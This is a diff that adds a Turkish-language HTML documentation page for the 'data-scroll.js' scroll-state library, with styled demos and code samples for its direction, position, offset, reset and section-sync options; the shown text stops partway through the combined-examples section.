@@ -1,0 +1,1088 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link rel="shortcut icon" href="favicon.png" type="image/x-icon" />
+   <title>Data Scroll — Dokümantasyon</title>
+   <style>
+      :root {
+         --bg: #0f1117;
+         --surface: #1a1d27;
+         --surface-2: #232734;
+         --border: #2e3348;
+         --text: #e2e4ed;
+         --text-muted: #8b8fa7;
+         --accent: #6c8aff;
+         --accent-hover: #8da5ff;
+         --green: #4ade80;
+         --orange: #fb923c;
+         --red: #f87171;
+         --code-bg: #141620;
+         --radius: 10px;
+      }
+
+      * {
+         box-sizing: border-box;
+         margin: 0;
+         padding: 0;
+      }
+
+      body {
+         font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+         background: var(--bg);
+         color: var(--text);
+         line-height: 1.65;
+         padding: 0;
+      }
+
+      /* ── Layout ── */
+      .wrapper {
+         max-width: 960px;
+         margin: 0 auto;
+         padding: 3rem 1.5rem 6rem;
+      }
+
+      /* ── Hero ── */
+      .hero {
+         text-align: center;
+         margin-bottom: 4rem;
+         padding: 3rem 1rem;
+         border-bottom: 1px solid var(--border);
+      }
+
+      .hero h1 {
+         font-size: 2.6rem;
+         font-weight: 700;
+         letter-spacing: -0.03em;
+         margin-bottom: 0.5rem;
+      }
+
+      .hero h1 span {
+         color: var(--accent);
+      }
+
+      .hero p {
+         color: var(--text-muted);
+         font-size: 1.15rem;
+         max-width: 600px;
+         margin: 0 auto;
+      }
+
+      /* ── TOC ── */
+      .toc {
+         background: var(--surface);
+         border: 1px solid var(--border);
+         border-radius: var(--radius);
+         padding: 1.5rem 2rem;
+         margin-bottom: 3rem;
+      }
+
+      .toc h2 {
+         font-size: 1rem;
+         text-transform: uppercase;
+         letter-spacing: 0.08em;
+         color: var(--text-muted);
+         margin-bottom: 1rem;
+      }
+
+      .toc ul {
+         list-style: none;
+         display: grid;
+         grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+         gap: 0.4rem 2rem;
+      }
+
+      .toc a {
+         color: var(--accent);
+         text-decoration: none;
+         font-size: 0.95rem;
+         transition: color 0.2s;
+      }
+
+      .toc a:hover {
+         color: var(--accent-hover);
+         text-decoration: underline;
+      }
+
+      /* ── Section ── */
+      .section {
+         margin-bottom: 3.5rem;
+      }
+
+      .section-header {
+         display: flex;
+         align-items: center;
+         gap: 0.75rem;
+         margin-bottom: 0.5rem;
+      }
+
+      .section-header h2 {
+         font-size: 1.5rem;
+         font-weight: 600;
+      }
+
+      .badge {
+         display: inline-block;
+         font-size: 0.7rem;
+         font-weight: 600;
+         text-transform: uppercase;
+         letter-spacing: 0.06em;
+         padding: 0.2rem 0.6rem;
+         border-radius: 999px;
+         background: var(--accent);
+         color: var(--bg);
+      }
+
+      .section>p {
+         color: var(--text-muted);
+         margin-bottom: 1.25rem;
+         max-width: 700px;
+      }
+
+      /* ── Syntax ── */
+      .syntax {
+         background: var(--code-bg);
+         border: 1px solid var(--border);
+         border-radius: var(--radius);
+         padding: 0.5rem 1rem;
+         margin-bottom: 1.25rem;
+         font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+         font-size: 0.88rem;
+         color: var(--orange);
+         overflow-x: auto;
+      }
+
+      /* ── Demo Card ── */
+      .demo-card {
+         background: var(--surface);
+         border: 1px solid var(--border);
+         border-radius: var(--radius);
+         overflow: hidden;
+         margin-bottom: 1rem;
+      }
+
+      .demo-area {
+         padding: 2rem;
+         display: flex;
+         flex-wrap: wrap;
+         align-items: center;
+         gap: 1rem;
+         min-height: 80px;
+         position: relative;
+      }
+
+      .demo-area.column {
+         flex-direction: column;
+         align-items: flex-start;
+      }
+
+      .code-block {
+         background: var(--code-bg);
+         border-top: 1px solid var(--border);
+         padding: 1rem 1.25rem;
+         overflow-x: auto;
+         position: relative;
+      }
+
+      .code-block pre {
+         font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+         font-size: 0.82rem;
+         line-height: 1.7;
+         color: var(--text-muted);
+         white-space: pre;
+         margin: 0;
+      }
+
+      .code-block .tag {
+         color: var(--red);
+      }
+
+      .code-block .attr {
+         color: var(--orange);
+      }
+
+      .code-block .str {
+         color: var(--green);
+      }
+
+      .code-block .cmt {
+         color: #555b78;
+         font-style: italic;
+      }
+
+      .code-label {
+         display: inline-block;
+         font-size: 0.7rem;
+         font-weight: 600;
+         text-transform: uppercase;
+         letter-spacing: 0.06em;
+         color: var(--text-muted);
+         margin-bottom: 0.5rem;
+      }
+
+      /* ── Notes ── */
+      .note {
+         background: #1a1d27;
+         border-left: 3px solid var(--accent);
+         padding: 0.8rem 1rem;
+         border-radius: 0 var(--radius) var(--radius) 0;
+         margin-top: 1rem;
+         font-size: 0.85rem;
+         color: var(--text-muted);
+      }
+
+      .note strong {
+         color: var(--text);
+      }
+
+      /* ── Demo Scroll Boxes ── */
+      .scroll-demo-box {
+         width: 100%;
+         max-width: 500px;
+         height: 180px;
+         overflow: auto;
+         border: 1px solid var(--border);
+         border-radius: 8px;
+         background: var(--code-bg);
+         padding: 1rem;
+         font-size: 0.85rem;
+         color: var(--text-muted);
+         position: relative;
+         transition: border-color 0.3s;
+      }
+
+      .scroll-demo-box-h {
+         width: 100%;
+         max-width: 500px;
+         height: 80px;
+         overflow-x: auto;
+         overflow-y: hidden;
+         border: 1px solid var(--border);
+         border-radius: 8px;
+         background: var(--code-bg);
+         padding: 1rem;
+         font-size: 0.85rem;
+         color: var(--text-muted);
+         white-space: nowrap;
+         transition: border-color 0.3s;
+      }
+
+      /* ── Class Indicators ── */
+      .class-indicator {
+         display: inline-flex;
+         align-items: center;
+         gap: 0.4rem;
+         padding: 0.35rem 0.75rem;
+         border-radius: 6px;
+         font-size: 0.78rem;
+         font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+         background: var(--surface-2);
+         border: 1px solid var(--border);
+         color: var(--text-muted);
+         transition: all 0.2s;
+      }
+
+      .class-indicator.active {
+         background: #1a2e1a;
+         border-color: var(--green);
+         color: var(--green);
+      }
+
+      .class-indicator .dot {
+         width: 6px;
+         height: 6px;
+         border-radius: 50%;
+         background: var(--text-muted);
+         transition: background 0.2s;
+      }
+
+      .class-indicator.active .dot {
+         background: var(--green);
+      }
+
+      .indicator-grid {
+         display: flex;
+         flex-wrap: wrap;
+         gap: 0.5rem;
+         margin-bottom: 1rem;
+      }
+
+      /* ── Sync Demo ── */
+      .sync-nav {
+         display: flex;
+         gap: 0.25rem;
+         border-bottom: 1px solid var(--border);
+         padding-bottom: 0;
+         margin-bottom: 0;
+         overflow-x: auto;
+      }
+
+      .sync-nav a {
+         padding: 0.5rem 1.2rem;
+         color: var(--text-muted);
+         text-decoration: none;
+         font-size: 0.9rem;
+         border-bottom: 2px solid transparent;
+         transition: all 0.2s;
+         white-space: nowrap;
+         margin-bottom: -1px;
+      }
+
+      .sync-nav a:hover {
+         color: var(--text);
+      }
+
+      .sync-nav a.toggle {
+         color: var(--accent);
+         border-bottom-color: var(--accent);
+      }
+
+      .sync-sections {
+         height: 300px;
+         overflow-y: auto;
+         border: 1px solid var(--border);
+         border-radius: 0 0 8px 8px;
+         background: var(--code-bg);
+      }
+
+      .sync-section {
+         padding: 2rem 1.5rem;
+         min-height: 250px;
+         border-bottom: 1px solid var(--border);
+      }
+
+      .sync-section:last-child {
+         border-bottom: none;
+      }
+
+      .sync-section h3 {
+         font-size: 1.1rem;
+         margin-bottom: 0.5rem;
+         color: var(--text);
+      }
+
+      .sync-section p {
+         color: var(--text-muted);
+         font-size: 0.88rem;
+         line-height: 1.7;
+      }
+
+      /* ── Responsive ── */
+      @media (max-width: 640px) {
+         .hero h1 {
+            font-size: 1.8rem;
+         }
+
+         .wrapper {
+            padding: 2rem 1rem 4rem;
+         }
+
+         .toc ul {
+            grid-template-columns: 1fr;
+         }
+      }
+
+      /* ── Footer ── */
+      .footer {
+         text-align: center;
+         padding: 2rem 0;
+         border-top: 1px solid var(--border);
+         margin-top: 2rem;
+         color: var(--text-muted);
+         font-size: 0.82rem;
+      }
+   </style>
+</head>
+
+<body>
+   <div class="wrapper">
+
+      <!-- ════════════ HERO ════════════ -->
+      <header class="hero">
+         <h1><span>data-scroll</span>.js</h1>
+         <p>Akıllı scroll durumu algılama aracı. Tek bir <code>data-scroll</code> attribute ile yön algılama, konum tespiti, offset, reset ve section sync özellikleri.</p>
+      </header>
+
+      <!-- ════════════ TOC ════════════ -->
+      <nav class="toc">
+         <h2>İçindekiler</h2>
+         <ul>
+            <li><a href="#direction">direction — Yön Algılama</a></li>
+            <li><a href="#position">position — Konum Tespiti (Dikey + Yatay)</a></li>
+            <li><a href="#offset">offset — Eşik Değeri</a></li>
+            <li><a href="#reset">reset — Yön Sıfırlama</a></li>
+            <li><a href="#sync">sync — Section Senkronizasyonu</a></li>
+            <li><a href="#combined">Birleşik Örnekler</a></li>
+            <li><a href="#classes">CSS Class Referansı</a></li>
+            <li><a href="#architecture">Mimari ve Teknik Detaylar</a></li>
+         </ul>
+      </nav>
+
+      <!-- ═══════════════════════════════════════════════
+           1. DIRECTION
+      ═══════════════════════════════════════════════ -->
+      <section id="direction" class="section">
+         <div class="section-header">
+            <h2>direction</h2>
+            <span class="badge">Temel</span>
+         </div>
+         <p>Dikey ve yatay scroll yönünü algılar. Kaydırma sırasında yön class'ları eklenir, scroll durduğunda otomatik olarak kaldırılır. Navbar gizleme, yön bazlı animasyonlar için idealdir.</p>
+
+         <div class="syntax"><code>data-scroll="direction"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="indicator-grid" id="dir-indicators">
+                  <span class="class-indicator" id="ind-up"><span class="dot"></span>.scrolling-up</span>
+                  <span class="class-indicator" id="ind-down"><span class="dot"></span>.scrolling-down</span>
+                  <span class="class-indicator" id="ind-left"><span class="dot"></span>.scrolling-left</span>
+                  <span class="class-indicator" id="ind-right"><span class="dot"></span>.scrolling-right</span>
+               </div>
+               <div class="scroll-demo-box" id="dir-demo" data-scroll="direction" style="height:220px">
+                  <div style="width:150%;padding-bottom:2rem">
+                     Bu kutuyu yukarı/aşağı ve sola/sağa kaydırarak yön class'larını gözlemleyin.<br><br>
+                     Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.<br><br>
+                     Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.<br><br>
+                     Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo.<br><br>
+                     Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt.<br><br>
+                     At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident.<br><br>
+                     Similique sunt in culpa qui officia deserunt mollitia animi, id est laborum et dolorum fuga. Et harum quidem rerum facilis est et expedita distinctio.
+                  </div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="tag">&lt;div</span> <span class="attr">data-scroll</span>=<span class="str">"direction"</span><span class="tag">&gt;</span>
+   <span class="cmt">&lt;!-- Kaydırılabilir içerik --&gt;</span>
+<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- Eklenen class'lar (scroll durduğunda otomatik kalkar): --&gt;</span>
+<span class="cmt">&lt;!-- .scrolling-up    → yukarı kaydırılıyorsa --&gt;</span>
+<span class="cmt">&lt;!-- .scrolling-down  → aşağı kaydırılıyorsa --&gt;</span>
+<span class="cmt">&lt;!-- .scrolling-left  → sola kaydırılıyorsa --&gt;</span>
+<span class="cmt">&lt;!-- .scrolling-right → sağa kaydırılıyorsa --&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>Nasıl çalışır?</strong> 30fps'lik bir detect loop sürekli çalışır. Önceki scroll konumu ile mevcut konum karşılaştırılır ve TOLERANCE (2px) eşik değerini aşan hareketlerde yön class'ı güncellenir. Scroll durduğunda (hareket algılanmadığında) yön class'ları otomatik olarak kaldırılır.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           2. POSITION
+      ═══════════════════════════════════════════════ -->
+      <section id="position" class="section">
+         <div class="section-header">
+            <h2>position</h2>
+            <span class="badge">Temel</span>
+         </div>
+         <p>Elemanın scroll konumunu algılar: en üstte mi, en altta mı, solda mı, sağda mı? Kenar durumlarına göre class ekler. Shadow, fade efektleri ve "yukarı dön" butonları için kullanılır.</p>
+
+         <div class="syntax"><code>data-scroll="position"</code></div>
+
+         <!-- Position — Dikey -->
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">↕️ Dikey Scroll</h3>
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="indicator-grid" id="pos-v-indicators">
+                  <span class="class-indicator" id="ind-top"><span class="dot"></span>.scroll-at-top</span>
+                  <span class="class-indicator" id="ind-bottom"><span class="dot"></span>.scroll-at-bottom</span>
+                  <span class="class-indicator" id="ind-center"><span class="dot"></span>.scroll-at-center</span>
+               </div>
+               <div class="scroll-demo-box" id="pos-demo" data-scroll="position" style="height:220px">
+                  Bu kutuyu yukarı/aşağı kaydırarak dikey konum class'larını gözlemleyin. Başlangıçta <code>.scroll-at-top</code> aktif olacaktır.<br><br>
+                  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.<br><br>
+                  Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.<br><br>
+                  Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.<br><br>
+                  Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.<br><br>
+                  Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam.<br><br>
+                  Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores.
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="tag">&lt;div</span> <span class="attr">data-scroll</span>=<span class="str">"position"</span><span class="tag">&gt;</span>
+   <span class="cmt">&lt;!-- Kaydırılabilir içerik --&gt;</span>
+<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- Dikey class'lar: --&gt;</span>
+<span class="cmt">&lt;!-- .scroll-at-top    → en üstte --&gt;</span>
+<span class="cmt">&lt;!-- .scroll-at-bottom → en altta --&gt;</span>
+<span class="cmt">&lt;!-- .scroll-at-center → ne üstte ne altta (ortada) --&gt;</span></pre>
+            </div>
+         </div>
+
+         <!-- Position — Yatay -->
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">↔️ Yatay Scroll</h3>
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="indicator-grid" id="pos-h-indicators">
+                  <span class="class-indicator" id="ind-start"><span class="dot"></span>.scroll-at-left</span>
+                  <span class="class-indicator" id="ind-end"><span class="dot"></span>.scroll-at-right</span>
+                  <span class="class-indicator" id="ind-hcenter"><span class="dot"></span>.scroll-at-center</span>
+               </div>
+               <div class="scroll-demo-box-h" id="pos-demo-h" data-scroll="position">
+                  <span style="display:inline-block;min-width:1200px">
+                     ← Sola/sağa kaydırarak yatay konum class'larını gözlemleyin. Bu içerik yeterince geniştir ve yatay kaydırma gerektirir. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. →
+                  </span>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="tag">&lt;div</span> <span class="attr">data-scroll</span>=<span class="str">"position"</span> <span class="attr">style</span>=<span class="str">"overflow-x:auto"</span><span class="tag">&gt;</span>
+   <span class="cmt">&lt;!-- Geniş içerik --&gt;</span>
+<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- Yatay class'lar: --&gt;</span>
+<span class="cmt">&lt;!-- .scroll-at-left   → en solda --&gt;</span>
+<span class="cmt">&lt;!-- .scroll-at-right  → en sağda --&gt;</span>
+<span class="cmt">&lt;!-- .scroll-at-center → ortada --&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>Center durumu:</strong> <code>.scroll-at-center</code> class'ı, eleman ne en üstte ne de en altta olduğunda (veya ne en solda ne de en sağda) eklenir. Yani kaydırma ortadayken aktif olur.
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>Tolerance:</strong> Kenar tespiti için 2px tolerans kullanılır. Bu sayede sub-pixel render farklılıkları sorun çıkarmaz.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           3. OFFSET
+      ═══════════════════════════════════════════════ -->
+      <section id="offset" class="section">
+         <div class="section-header">
+            <h2>offset:&lt;değer&gt;</h2>
+            <span class="badge">Ayarlama</span>
+         </div>
+         <p>Scroll algılamanın başlaması için gereken minimum kaydırma mesafesi. <code>px</code>, <code>%</code> veya CSS değişkeni (<code>var(--name)</code>) kabul eder. Örneğin <code>offset:80px</code> ile eleman 80px kaydırılana kadar hiçbir class eklenmez/çıkarılmaz — tüm işlemler offset değeri aşıldıktan sonra başlar.</p>
+
+         <div class="syntax"><code>data-scroll="direction, position, offset:80px"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="indicator-grid" style="margin-bottom:0.5rem">
+                  <span class="class-indicator" id="ind-off-top"><span class="dot"></span>.scroll-at-top</span>
+                  <span class="class-indicator" id="ind-off-bottom"><span class="dot"></span>.scroll-at-bottom</span>
+                  <span class="class-indicator" id="ind-off-center"><span class="dot"></span>.scroll-at-center</span>
+                  <span class="class-indicator" id="ind-off-up"><span class="dot"></span>.scrolling-up</span>
+                  <span class="class-indicator" id="ind-off-down"><span class="dot"></span>.scrolling-down</span>
+               </div>
+               <div class="scroll-demo-box" id="offset-demo" data-scroll="direction, position, offset:80px" style="height:220px">
+                  <strong>offset:80px</strong> — İlk 80px kaydırılana kadar hiçbir class eklenmez. 80px geçildikten sonra tüm işlemler başlar.<br><br>
+                  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.<br><br>
+                  Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.<br><br>
+                  Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.<br><br>
+                  Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.<br><br>
+                  Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis.<br><br>
+                  Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt.
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- Piksel değeri --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-scroll</span>=<span class="str">"position, offset:200px"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- Yüzde değeri --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-scroll</span>=<span class="str">"position, offset:80%"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- CSS değişkeni --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-scroll</span>=<span class="str">"position, offset:var(--header-height)"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>CSS Değişkeni:</strong> <code>var(--name)</code> sözdizimi kullanıldığında, değer <code>getComputedStyle</code> ile çözümlenir. Böylece dinamik değerlerle (örn. değişken header yüksekliği) çalışabilirsiniz.
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>Yüzde hesabı:</strong> <code>%</code> değeri, elemanın toplam kaydırılabilir mesafesine (<code>scrollHeight - clientHeight</code>) göre hesaplanır. Örneğin <code>offset:50%</code> ise toplam mesafenin yarısı geçilene kadar class'lar eklenmez.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           4. RESET
+      ═══════════════════════════════════════════════ -->
+      <section id="reset" class="section">
+         <div class="section-header">
+            <h2>reset:at-*</h2>
+            <span class="badge">Yardımcı</span>
+         </div>
+         <p>Belirtilen kenara ulaşıldığında tüm scroll class'larını (yön + konum) sıfırlar. En üste dönüldüğünde temiz bir başlangıç durumu sağlamak için kullanılır.</p>
+
+         <div class="syntax"><code>data-scroll="position, reset:at-top"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="indicator-grid" id="reset-indicators">
+                  <span class="class-indicator" id="ind-r-top"><span class="dot"></span>.scroll-at-top</span>
+                  <span class="class-indicator" id="ind-r-bottom"><span class="dot"></span>.scroll-at-bottom</span>
+                  <span class="class-indicator" id="ind-r-center"><span class="dot"></span>.scroll-at-center</span>
+               </div>
+               <div class="scroll-demo-box" id="reset-demo" data-scroll="position, reset:at-top" style="height:220px">
+                  <strong>reset:at-top</strong> — En üste ulaşıldığında tüm class'lar sıfırlanır, indicator'ların hepsi söner.<br><br>
+                  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.<br><br>
+                  Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.<br><br>
+                  Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.<br><br>
+                  Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.<br><br>
+                  Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis.<br><br>
+                  Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores.
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- En üste gelince tüm scroll class'larını temizle --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-scroll</span>=<span class="str">"position, reset:at-top"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- Hem üst hem alt kenarda temizle --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-scroll</span>=<span class="str">"position, reset:at-top, reset:at-bottom"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- Yatay kenarlar için --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-scroll</span>=<span class="str">"position, reset:at-left, reset:at-right"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>Kullanım senaryosu:</strong> Sayfa en üste döndüğünde <code>scroll-at-top</code>, <code>scroll-at-center</code> gibi tüm konum class'larının kalkması ve sıfırdan başlaması istendiğinde <code>reset:at-top</code> kullanılır.
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>Seçenekler:</strong> <code>reset:at-top</code>, <code>reset:at-bottom</code>, <code>reset:at-left</code>, <code>reset:at-right</code> — her biri bağımsız olarak kullanılabilir veya birleştirilebilir. Belirtilen kenara ulaşıldığında tüm scroll class'ları (yön + konum) kaldırılır.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           5. SYNC
+      ═══════════════════════════════════════════════ -->
+      <section id="sync" class="section">
+         <div class="section-header">
+            <h2>sync</h2>
+            <span class="badge">Gelişmiş</span>
+         </div>
+         <p>Section görünürlüğüne dayalı navigasyon senkronizasyonu. Scroll pozisyonuna göre hangi section'ın en çok görünür olduğunu hesaplar ve ilgili nav linkini aktif yapar. One-page siteler ve içerik navigasyonları için ideal.</p>
+
+         <div class="syntax"><code>data-scroll="sync, syncButtons:[data-nav]"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column" style="padding:0">
+               <div id="sync-demo" data-scroll="sync, syncButtons:[data-nav], syncActiveClass:toggle" style="width:100%;height:350px;overflow-y:auto;border-radius:8px;background:var(--code-bg);">
+                  <nav class="sync-nav" data-nav style="position:sticky;top:0;z-index:5;background:var(--surface);">
+                     <a href="#sec-about" class="toggle">Hakkında</a>
+                     <a href="#sec-features">Özellikler</a>
+                     <a href="#sec-usage">Kullanım</a>
+                     <a href="#sec-api">API</a>
+                  </nav>
+                  <div class="sync-section" id="sec-about">
+                     <h3>Hakkında</h3>
+                     <p>Data Scroll, scroll durumunu akıllıca algılayan ve CSS class'ları ile yansıtan bir JavaScript aracıdır. Herhangi bir bağımlılık gerektirmez ve MutationObserver ile dinamik içerikleri destekler.<br><br>Performans odaklı tasarımı sayesinde requestAnimationFrame kullanarak smooth rendering sağlar.</p>
+                  </div>
+                  <div class="sync-section" id="sec-features">
+                     <h3>Özellikler</h3>
+                     <p>Yön algılama, konum tespiti, offset desteği, reset mekanizması ve section sync gibi kapsamlı özellikler sunar.<br><br>ResizeObserver ve interval tabanlı yükseklik kontrolü ile iOS/Safari uyumluluğu sağlanır.</p>
+                  </div>
+                  <div class="sync-section" id="sec-usage">
+                     <h3>Kullanım</h3>
+                     <p>Tek yapmanız gereken elemana <code>data-scroll</code> attribute'u eklemek. Parametreleri virgülle ayırarak birden fazla özelliği bir arada kullanabilirsiniz.<br><br>Dinamik olarak eklenen elemanlar MutationObserver sayesinde otomatik algılanır.</p>
+                  </div>
+                  <div class="sync-section" id="sec-api">
+                     <h3>API</h3>
+                     <p>Tüm yapılandırma HTML attribute'ları üzerinden yapılır. JavaScript API'si gerekmez — sadece <code>data-scroll</code> attribute'u ve parametreleri yeterlidir.<br><br>Export edilen <code>dataScroll()</code> fonksiyonu çağrıldığında tüm mevcut elemanlar initialize edilir.</p>
+                  </div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- Navigasyon linkleri — data-scroll elemanı içinde --&gt;</span>
+<span class="tag">&lt;nav</span> <span class="attr">data-nav</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;a</span> <span class="attr">href</span>=<span class="str">"#about"</span><span class="tag">&gt;</span>Hakkında<span class="tag">&lt;/a&gt;</span>
+   <span class="tag">&lt;a</span> <span class="attr">href</span>=<span class="str">"#features"</span><span class="tag">&gt;</span>Özellikler<span class="tag">&lt;/a&gt;</span>
+   <span class="tag">&lt;a</span> <span class="attr">href</span>=<span class="str">"#usage"</span><span class="tag">&gt;</span>Kullanım<span class="tag">&lt;/a&gt;</span>
+<span class="tag">&lt;/nav&gt;</span>
+
+<span class="cmt">&lt;!-- Kaydırılabilir alan — sync aktif, nav içeride olmalı --&gt;</span>
+<span class="tag">&lt;main</span> <span class="attr">data-scroll</span>=<span class="str">"sync, syncButtons:[data-nav]"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;nav</span> <span class="attr">data-nav</span><span class="tag">&gt;</span>...<span class="tag">&lt;/nav&gt;</span>
+   <span class="tag">&lt;section</span> <span class="attr">id</span>=<span class="str">"about"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/section&gt;</span>
+   <span class="tag">&lt;section</span> <span class="attr">id</span>=<span class="str">"features"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/section&gt;</span>
+   <span class="tag">&lt;section</span> <span class="attr">id</span>=<span class="str">"usage"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/section&gt;</span>
+<span class="tag">&lt;/main&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>syncButtons:</strong> Nav container'ın CSS seçicisini belirtir. İçindeki <code>a[href^="#"]</code> linkleri otomatik taranır ve <code>href</code> değerleri section ID'leriyle eşleştirilir.
+         </div>
+         <div class="note">
+            <strong>syncActiveClass:</strong> Aktif linke eklenecek class adı. Varsayılan değer <code>toggle</code>'dır — bu class CSS'te stil vermek için kullanılır. Özel bir class belirtmek için <code>syncActiveClass:is-active</code> gibi kullanın.
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>Skor hesaplama:</strong> Her section'ın viewport'ta kaplama oranı ve merkeze uzaklığı hesaplanır. En yüksek skora sahip section aktif kabul edilir. Bu sayede kısa ve uzun section'lar adil şekilde değerlendirilir.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           6. COMBINED EXAMPLES
+      ═══════════════════════════════════════════════ -->
+      <section id="combined" class="section">
+         <div class="section-header">
+            <h2>Birleşik Örnekler</h2>
+            <span class="badge">Pratik</span>
+         </div>
+         <p>Parametreler virgülle birleştirilerek güçlü yapılandırmalar oluşturulabilir. İşte gerçek dünyadan örnekler:</p>
+
+         <!-- Example A: Navbar Gizle/Göster -->
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">📌 Navbar Gizle/Göster</h3>
+         <div class="demo-card">
+            <div class="demo-area column">
